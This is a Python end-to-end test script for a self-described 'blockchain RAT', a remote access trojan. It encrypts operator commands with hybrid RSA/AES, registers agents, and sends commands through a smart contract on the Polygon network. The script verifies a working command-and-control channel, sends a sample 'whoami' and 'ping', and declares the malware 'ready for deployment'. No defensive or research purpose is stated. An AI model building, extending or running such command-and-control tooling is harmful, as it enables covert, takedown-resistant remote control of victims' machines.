#!/usr/bin/env python3
"""
Full System Test
Tests the entire blockchain RAT workflow
"""

import sys
import json
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

print("=" * 70)
print("BLOCKCHAIN RAT - FULL SYSTEM TEST")
print("=" * 70)
print()

# Test 1: Check dependencies
print("[1/10] Checking dependencies...")
try:
    from web3 import Web3
    from eth_account import Account
    from cryptography.hazmat.primitives import hashes
    from Crypto.Cipher import AES
    print("  ✓ All dependencies installed")
except ImportError as e:
    print(f"  ✗ Missing dependency: {e}")
    print("  Run: pip install web3 eth-account cryptography pycryptodome")
    sys.exit(1)

# Test 2: Load configuration
print("\n[2/10] Loading configuration...")
deployment_file = Path(__file__).parent.parent / "deployment.json"
if not deployment_file.exists():
    print("  ✗ deployment.json not found")
    print("  Deploy the contract first!")
    sys.exit(1)

with open(deployment_file) as f:
    deployment = json.load(f)

print(f"  ✓ Contract: {deployment['contract_address']}")
print(f"  ✓ Network: {deployment['network']}")

# Test 3: Import modules
print("\n[3/10] Importing project modules...")
try:
    from shared.encryption import EncryptionManager
    from shared.blockchain_client import BlockchainClient
    print("  ✓ Encryption module")
    print("  ✓ Blockchain client module")
except Exception as e:
    print(f"  ✗ Import error: {e}")
    sys.exit(1)

# Test 4: Test encryption
print("\n[4/10] Testing encryption...")
try:
    em = EncryptionManager()
    admin_private, admin_public = em.generate_rsa_keypair()
    agent_private, agent_public = em.generate_rsa_keypair()
    
    test_data = b"Test command: whoami"
    encrypted = em.hybrid_encrypt(test_data, agent_public)
    decrypted = em.hybrid_decrypt(encrypted, agent_private)
    
    assert decrypted == test_data, "Decryption mismatch!"
    print("  ✓ Encryption/Decryption working")
except Exception as e:
    print(f"  ✗ Encryption test failed: {e}")
    sys.exit(1)

# Test 5: Check blockchain connection
print("\n[5/10] Testing blockchain connection...")
print("  Enter admin private key (or press Enter to skip blockchain tests):")
admin_key = input("  Private key: ").strip()

if not admin_key:
    print("  ⊘ Skipping blockchain tests")
    print()
    print("=" * 70)
    print("PARTIAL TEST COMPLETE")
    print("=" * 70)
    print("✓ Dependencies OK")
    print("✓ Modules OK")
    print("✓ Encryption OK")
    print("⊘ Blockchain tests skipped")
    sys.exit(0)

try:
    admin_config = {
        'rpc_url': deployment.get('rpc_url', 'https://polygon-rpc.com'),
        'contract_address': deployment['contract_address'],
        'private_key': admin_key
    }
    
    admin_bc = BlockchainClient(admin_config)
    print(f"  ✓ Connected to blockchain")
    print(f"  ✓ Admin address: {admin_bc.address}")
    print(f"  ✓ Block number: {admin_bc.w3.eth.block_number}")
except Exception as e:
    print(f"  ✗ Connection failed: {e}")
    sys.exit(1)

# Test 6: Create test agent
print("\n[6/10] Creating test agent...")
try:
    test_agent_account = Account.create()
    agent_config = {
        'rpc_url': deployment.get('rpc_url', 'https://polygon-rpc.com'),
        'contract_address': deployment['contract_address'],
        'private_key': test_agent_account.key.hex()
    }
    
    agent_bc = BlockchainClient(agent_config)
    print(f"  ✓ Test agent created")
    print(f"  ✓ Agent address: {agent_bc.address}")
except Exception as e:
    print(f"  ✗ Agent creation failed: {e}")
    sys.exit(1)

# Test 7: Register agent
print("\n[7/10] Registering agent on blockchain...")
try:
    agent_public_hex = em.public_key_to_hex(agent_public)
    
    # Note: Agent needs MATIC to register
    print("  ! Agent needs MATIC for gas")
    print(f"    Send ~0.01 MATIC to: {agent_bc.address}")
    print("  Press Enter when ready...")
    input()
    
    receipt = agent_bc.register_agent(agent_public_hex)
    print(f"  ✓ Agent registered")
    print(f"  ✓ Transaction: {receipt['transactionHash'].hex()}")
except Exception as e:
    print(f"  ✗ Registration failed: {e}")
    print(f"  Make sure agent has MATIC for gas")
    sys.exit(1)

# Test 8: Create session
print("\n[8/10] Creating session...")
try:
    session_id = admin_bc.create_session(agent_bc.address)
    print(f"  ✓ Session created")
    print(f"  ✓ Session ID: {session_id}")
except Exception as e:
    print(f"  ✗ Session creation failed: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

# Test 9: Send command
print("\n[9/10] Sending test command...")
try:
    command = {'type': 'ping'}
    command_json = json.dumps(command)
    
    # Get agent public key from blockchain
    agent_key_hex = admin_bc.get_agent_public_key(agent_bc.address)
    agent_public_key = em.hex_to_public_key(agent_key_hex)
    
    # Encrypt command
    encrypted = em.hybrid_encrypt(command_json.encode(), agent_public_key)
    encoded = em.encode_payload_for_blockchain(encrypted)
    
    # Send to blockchain
    receipt = admin_bc.send_message(session_id, encoded, 1)
    print(f"  ✓ Command sent")
    print(f"  ✓ Transaction: {receipt['transactionHash'].hex()}")
except Exception as e:
    print(f"  ✗ Send command failed: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

# Test 10: Verify message on blockchain
print("\n[10/10] Verifying message on blockchain...")
try:
    message_count = admin_bc.get_message_count(session_id)
    print(f"  ✓ Message count: {message_count}")
    
    if message_count > 0:
        messages = admin_bc.get_messages(session_id, 0, message_count)
        print(f"  ✓ Retrieved {len(messages)} message(s)")
    else:
        print("  ! No messages found (might need to wait for confirmation)")
except Exception as e:
    print(f"  ✗ Message verification failed: {e}")

print()
print("=" * 70)
print("FULL SYSTEM TEST COMPLETE!")
print("=" * 70)
print()
print("✓ All core components working")
print("✓ Blockchain integration functional")
print("✓ Ready for deployment")
print()
print(f"Test Agent Address: {agent_bc.address}")
print(f"Test Session ID: {session_id}")
print()

